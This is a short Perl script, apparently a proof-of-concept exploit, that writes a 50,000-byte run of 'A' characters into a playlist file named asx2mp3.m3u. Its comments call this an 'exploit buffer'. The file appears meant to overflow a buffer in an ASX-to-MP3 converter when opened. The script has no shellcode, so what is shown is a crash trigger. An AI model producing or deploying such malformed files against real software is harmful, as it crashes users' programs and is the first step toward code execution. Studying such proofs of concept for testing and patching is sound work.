#!/usr/bin/perl


my $buffsize = 50000; #sets buffer size for consistent sized payload

my $buffer = "\x41" x $buffsize; #build the exploit buffer

#write the exploit buffer to file
my $file = "asx2mp3.m3u";
open(FILE,">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created[" . $file . "]\n";
print "Buffer size: " . length($buffer) . "\n";
